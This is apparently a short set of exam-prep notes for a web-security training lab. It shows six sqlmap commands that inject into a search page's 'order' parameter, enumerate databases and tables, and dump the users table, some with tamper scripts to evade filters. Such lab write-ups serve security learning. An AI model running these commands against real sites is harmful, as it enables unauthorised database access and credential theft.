## _**Advanced Search Functionality**_
### - **SQL injection to retreive Administrator cookies through advanced search (Practice Exam)**
- Here we use the asterisk (*) to set the injection point for sqlmap. Which is the "order" parameter in this scenario.

```
sqlmap -u 'https://LAB-ID.web-security-academy.net/filtered_search?find=cizipbkq&organize=4&order=ASC*&BlogArtist=Sophie+Mail' --random-agent --time-sec 10 --cookie='session=YOUR-SESSION-COOKIE' --level 5 and --risk 3 --dbs
```

```
sqlmap -u 'https://LAB-ID.web-security-academy.net/filtered_search?find=cizipbkq&organize=4&order=ASC*&BlogArtist=Sophie+Mail' --random-agent --time-sec 10 --cookie='session=YOUR-SESSION-COOKIE' --level 5 and --risk 3 --tamper="between,randomcase,space2comment" --dbs
```

```
sqlmap -u 'https://LAB-ID.web-security-academy.net/filtered_search?find=cizipbkq&organize=4&order=ASC*&BlogArtist=Sophie+Mail' --random-agent --time-sec 10 --cookie='session=YOUR-SESSION-COOKIE' --level 5 and --risk 3 -D public --tables
```

```
sqlmap -u 'https://LAB-ID.web-security-academy.net/filtered_search?find=cizipbkq&organize=4&order=ASC*&BlogArtist=Sophie+Mail' --random-agent --time-sec 10 --cookie='session=YOUR-SESSION-COOKIE' --level 5 and --risk 3 --tamper="between,randomcase,space2comment" -D public --tables
```

```
sqlmap -u 'https://LAB-ID.web-security-academy.net/filtered_search?find=cizipbkq&organize=4&order=ASC*&BlogArtist=Sophie+Mail' --random-agent --time-sec 10 --cookie='session=YOUR-SESSION-COOKIE' --level 5 and --risk 3 -D public -T users --dump
```

```
sqlmap -u 'https://LAB-ID.web-security-academy.net/filtered_search?find=cizipbkq&organize=4&order=ASC*&BlogArtist=Sophie+Mail' --random-agent --time-sec 10 --cookie='session=YOUR-SESSION-COOKIE' --level 5 and --risk 3 --tamper="between,randomcase,space2comment" -D public -T users --dump
```